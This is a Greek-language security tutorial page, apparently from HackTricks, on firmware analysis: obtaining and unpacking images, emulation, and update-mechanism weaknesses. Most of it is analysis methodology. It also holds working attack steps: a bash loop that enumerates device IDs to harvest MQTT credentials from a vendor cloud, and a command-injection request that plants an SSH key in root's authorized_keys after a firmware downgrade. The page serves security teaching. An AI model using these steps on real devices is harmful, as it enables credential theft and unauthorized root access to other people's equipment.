# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Το firmware είναι ουσιώδες λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των hardware components και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, εξασφαλίζοντας ότι η συσκευή έχει πρόσβαση σε κρίσιμες εντολές από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και πιθανή τροποποίηση του firmware είναι κρίσιμο βήμα για την ταυτοποίηση ευπαθειών ασφαλείας.

## **Συλλογή Πληροφοριών**

**Συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων για:

- Την CPU architecture και το λειτουργικό σύστημα που τρέχει
- Λεπτομέρειες για τον Bootloader
- Διάταξη hardware και datasheets
- Μετρικές του codebase και τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύποι αδειών
- Ιστορικό ενημερώσεων και ρυθμιστικές πιστοποιήσεις
- Αρχιτεκτονικά και διαγράμματα ροής
- Αξιολογήσεις ασφάλειας και προσδιορισμένες ευπάθειες

Για αυτό το σκοπό, τα εργαλεία open-source intelligence (OSINT) είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source software components μέσω χειροκίνητων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορούν να αξιοποιηθούν για να βρεθούν πιθανά ζητήματα.

## **Απόκτηση του Firmware**

Η απόκτηση του firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με το δικό του επίπεδο πολυπλοκότητας:

- **Άμεσα** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Δημιουργία** του από τις παρεχόμενες οδηγίες
- **Λήψη** από επίσημους ιστοτόπους υποστήριξης
- Χρήση **Google dork** queries για την εύρεση hosted firmware αρχείων
- Πρόσβαση σε **cloud storage** απευθείας, με εργαλεία όπως [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **updates** μέσω man-in-the-middle τεχνικών
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG**, ή **PICit**
- **Sniffing** για αιτήματα ενημέρωσης εντός της επικοινωνίας της συσκευής
- Εντοπισμός και χρήση **hardcoded update endpoints**
- **Dumping** από τον bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτύχουν, χρησιμοποιώντας τα κατάλληλα hardware εργαλεία

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξάγετε πληροφορίες γι' αυτό για να ξέρετε πώς να το χειριστείτε. Διάφορα εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρείτε πολλά με αυτά τα εργαλεία ελέγξτε την **entropy** της εικόνας με `binwalk -E <bin>`, αν η entropy είναι χαμηλή τότε πιθανότατα δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, είναι πιθανό να είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιο τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξάγετε **αρχεία ενσωματωμένα μέσα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Απόκτηση του filesystem

Με τα προηγούμενα εργαλεία που αναφέρθηκαν, όπως `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξάγετε το filesystem**.\
Ο binwalk συνήθως το εξάγει μέσα σε έναν **φάκελο με όνομα τύπου filesystem**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη Εξαγωγή του filesystem

Κάποιες φορές, ο binwalk **δεν θα έχει το magic byte του filesystem στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε τον binwalk για να **βρείτε το offset του filesystem και να carve το συμπιεσμένο filesystem** από το binary και **να εξάγετε χειροκίνητα** το filesystem ανάλογα με τον τύπο του χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη εντολή **dd** για carving του Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, μπορεί επίσης να εκτελεστεί η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (χρησιμοποιήθηκε στο παράδειγμα παραπάνω)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στον κατάλογο `squashfs-root` στη συνέχεια.

- Αρχεία CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για jffs2 συστήματα αρχείων

`$ jefferson rootfsfile.jffs2`

- Για ubifs συστήματα αρχείων με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να το αποδομήσετε για να κατανοήσετε τη δομή του και τις πιθανές ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από την εικόνα του firmware.

### Initial Analysis Tools

Παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του δυαδικού αρχείου (αναφερόμενου ως `<bin>`). Αυτές οι εντολές βοηθούν στην αναγνώριση τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση λεπτομερειών κατατμήσεων και συστημάτων αρχείων:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **entropy** με `binwalk -E <bin>`. Χαμηλή entropy υποδηλώνει έλλειψη κρυπτογράφησης, ενώ υψηλή entropy υποδεικνύει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή των **embedded files**, προτείνονται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Χρησιμοποιώντας `binwalk -ev <bin>`, συνήθως μπορεί κανείς να εξάγει το σύστημα αρχείων, συχνά μέσα σε έναν κατάλογο ονομασμένο σύμφωνα με τον τύπο του συστήματος αρχείων (π.χ., squashfs, ubifs). Ωστόσο, όταν η **binwalk** δεν αναγνωρίζει τον τύπο του συστήματος αρχείων λόγω ελλείποντων magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για εντοπισμό του offset του συστήματος αρχείων, ακολουθούμενη από την εντολή `dd` για την εξαγωγή (carve) του συστήματος αρχείων:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για να εξαχθούν χειροκίνητα τα περιεχόμενα.

### Ανάλυση συστήματος αρχείων

Αφού εξαχθεί το filesystem, ξεκινά η αναζήτηση για ευπάθειες ασφαλείας. Δίνεται προσοχή σε ανασφαλείς network daemons, hardcoded credentials, API endpoints, λειτουργίες του update server, uncompiled code, startup scripts και compiled binaries για offline analysis.

**Κύριες τοποθεσίες** και **αντικείμενα** προς έλεγχο περιλαμβάνουν:

- **etc/shadow** and **etc/passwd** for user credentials
- Πιστοποιητικά SSL και κλειδιά στο **etc/ssl**
- Αρχεία ρυθμίσεων και script για πιθανές ευπάθειες
- Ενσωματωμένα binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Πολλά εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών μέσα στο filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Έλεγχοι Ασφαλείας σε Compiled Binaries

Τόσο ο source code όσο και τα compiled binaries που βρέθηκαν στο filesystem πρέπει να ελεγχθούν προσεκτικά για ευπάθειες. Εργαλεία όπως **checksec.sh** για Unix binaries και **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να εκμεταλλευτούν.

## Συλλογή cloud config και διαπιστευτηρίων MQTT μέσω παραγόμενων URL token

Πολλοί IoT hubs ανακτούν τη per-device configuration από ένα cloud endpoint που μοιάζει με:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Κατά την ανάλυση firmware μπορεί να βρείτε ότι το <token> προκύπτει τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτό το σχέδιο επιτρέπει σε οποιονδήποτε μάθει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να τραβήξει το cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.

Πρακτική ροή εργασίας:

1) Εξάγετε το deviceId από τα UART boot logs

- Συνδέστε έναν 3.3V UART adapter (TX/RX/GND) και καταγράψτε τα logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που εμφανίζουν το pattern του cloud config URL και τη διεύθυνση του broker, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτηση STATIC_KEY και αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε το config path ("/pf/") ή χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Παράξτε το token σε Bash και μετατρέψτε το digest σε uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και διαπιστευτηρίων MQTT

- Συνθέστε το URL και τραβήξτε το JSON με curl; αναλύστε με jq για να εξάγετε τα secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Κατάχρηση plaintext MQTT και αδύναμων topic ACLs (αν υπάρχουν)

- Χρησιμοποιήστε recovered credentials για να εγγραφείτε σε maintenance topics και αναζητήστε ευαίσθητα συμβάντα:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Απαρίθμηση προβλέψιμων device IDs (σε κλίμακα, με authorization)

- Πολλά ecosystems ενσωματώνουν vendor OUI/product/type bytes ακολουθούμενα από sequential suffix.
- Μπορείτε να iterate candidate IDs, να derive tokens και να fetch configs προγραμματιστικά:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Πάντα εξασφαλίστε ρητή εξουσιοδότηση πριν επιχειρήσετε mass enumeration.
- Προτιμήστε emulation ή static analysis για την ανάκτηση μυστικών χωρίς να τροποποιήσετε το target hardware όταν είναι δυνατόν.

Η διαδικασία του emulating firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να συναντήσει προκλήσεις λόγω εξαρτήσεων από hardware ή architecture, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη architecture και endianness, όπως ένα Raspberry Pi, ή σε μια προ-κατασκευασμένη virtual machine, μπορεί να διευκολύνει περαιτέρω testing.

### Emulating Individual Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε το endianness και την CPU architecture του προγράμματος.

#### Παράδειγμα με MIPS Architecture

Για να emulate ένα MIPS architecture binary, μπορείτε να χρησιμοποιήσετε την εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα εργαλεία προσομοίωσης:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian), χρησιμοποιείται `qemu-mips`, και για little-endian binaries, η επιλογή θα ήταν `qemu-mipsel`.

#### ARM Architecture Emulation

Για ARM binaries, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για emulation.

### Full System Emulation

Εργαλεία όπως [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), και άλλα, διευκολύνουν την πλήρη emulation του firmware, αυτοματοποιώντας τη διαδικασία και βοηθώντας στην dynamic analysis.

## Dynamic Analysis in Practice

Σε αυτό το στάδιο χρησιμοποιείται είτε ένα πραγματικό είτε ένα emulated περιβάλλον συσκευής για ανάλυση. Είναι ουσιώδες να διατηρείται πρόσβαση σε shell στο OS και το filesystem. Η emulation μπορεί να μην μιμείται τέλεια τις hardware αλληλεπιδράσεις, απαιτώντας κατά διαστήματα επανεκκίνησης της emulation. Η ανάλυση θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται εκτεθειμένες webpages και network services, και να διερευνά ευπάθειες του bootloader. Έλεγχοι ακεραιότητας firmware είναι κρίσιμοι για τον εντοπισμό πιθανών backdoor vulnerabilities.

## Runtime Analysis Techniques

Το runtime analysis περιλαμβάνει αλληλεπίδραση με μια διεργασία ή binary στο περιβάλλον λειτουργίας της, χρησιμοποιώντας εργαλεία όπως gdb-multiarch, Frida και Ghidra για τοποθέτηση breakpoints και εντοπισμό ευπαθειών μέσω fuzzing και άλλων τεχνικών.

## Binary Exploitation and Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένες ευπάθειες απαιτεί βαθιά κατανόηση της target architecture και προγραμματισμό σε lower-level languages. Binary runtime protections σε embedded systems είναι σπάνιες, αλλά όταν υπάρχουν, τεχνικές όπως Return Oriented Programming (ROP) μπορεί να είναι απαραίτητες.

## Prepared Operating Systems for Firmware Analysis

Λειτουργικά συστήματα όπως [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν προ-διαμορφωμένα περιβάλλοντα για firmware security testing, εξοπλισμένα με τα απαραίτητα εργαλεία.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS είναι ένα distro προορισμένο να σας βοηθήσει να πραγματοποιήσετε security assessment και penetration testing των Internet of Things (IoT) devices. Σας εξοικονομεί πολύ χρόνο παρέχοντας ένα προ-διαμορφωμένο περιβάλλον με όλα τα απαραίτητα tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο σε Ubuntu 18.04, προφορτωμένο με firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Ακόμα και όταν ένας vendor εφαρμόζει cryptographic signature checks για τα firmware images, **η προστασία από version rollback (downgrade) συχνά παραλείπεται**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με ένα ενσωματωμένο public key αλλά δεν συγκρίνει την *version* (ή έναν monotonic counter) της εικόνας που γίνεται flash, ένας επιτιθέμενος μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, ευάλωτο firmware που εξακολουθεί να φέρει έγκυρη υπογραφή** και έτσι να επαναφέρει ευπάθειες που είχαν επιδιορθωθεί.

Typical attack workflow:

1. **Obtain an older signed image**
* Κατεβάστε το από το δημόσιο download portal του vendor, CDN ή support site.
* Εξάγετε το από συνοδευτικές mobile/desktop εφαρμογές (π.χ. μέσα σε ένα Android APK υπό `assets/firmware/`).
* Ανακτήστε το από third-party repositories όπως VirusTotal, Internet archives, forums, κ.ά.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, κ.λπ.
* Πολλές consumer IoT συσκευές εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα αποκωδικοποιούν server-side και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλευτείτε μια ευπάθεια που είχε επιδιορθωθεί στην πιο πρόσφατη έκδοση (π.χ. ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά, flash-άρετε ξανά την πιο πρόσφατη εικόνα ή απενεργοποιήστε τις ενημερώσεις για να αποφύγετε την ανίχνευση μόλις αποκτηθεί persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (downgraded) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε ένα shell command χωρίς sanitisation, επιτρέποντας injection αυθαίρετων εντολών (εδώ — enabling SSH key-based root access). Μεταγενέστερες εκδόσεις του firmware εισήγαγαν ένα βασικό character filter, αλλά η απουσία downgrade protection καθιστά την επιδιόρθωση άνευ αντικειμένου.

### Εξαγωγή firmware από εφαρμογές κινητών

Πολλοί vendors συμπεριλαμβάνουν πλήρη firmware images μέσα στις companion mobile εφαρμογές τους ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi‑Fi. Αυτά τα πακέτα συνήθως αποθηκεύονται μη κρυπτογραφημένα στο APK/APEX υπό μονοπάτια όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως `apktool`, `ghidra`, ή ακόμη και απλό `unzip` σας επιτρέπουν να εξάγετε signed images χωρίς να αγγίξετε το φυσικό hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Λίστα ελέγχου για την αξιολόγηση της λογικής ενημέρωσης

* Είναι η μεταφορά/αυθεντικοποίηση του *update endpoint* επαρκώς προστατευμένη (TLS + authentication);
* Συγκρίνει η συσκευή **version numbers** ή έναν **monotonic anti-rollback counter** πριν το flashing;
* Επιβεβαιώνεται το image μέσα σε secure boot chain (π.χ. signatures ελέγχονται από ROM code);
* Εκτελεί ο userland κώδικας επιπλέον sanity checks (π.χ. allowed partition map, model number);
* Επαναχρησιμοποιούν οι *partial* ή *backup* update flows την ίδια validation logic;

> 💡  Εάν οποιοδήποτε από τα παραπάνω λείπει, η πλατφόρμα πιθανώς είναι ευάλωτη σε rollback attacks.

## Ευάλωτο firmware για πρακτική

Για να εξασκηθείτε στο να ανακαλύπτετε ευπάθειες σε firmware, χρησιμοποιήστε τα παρακάτω ευάλωτα firmware projects ως σημείο εκκίνησης.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Αναφορές

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Εκπαίδευση και Πιστοποιήσεις

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
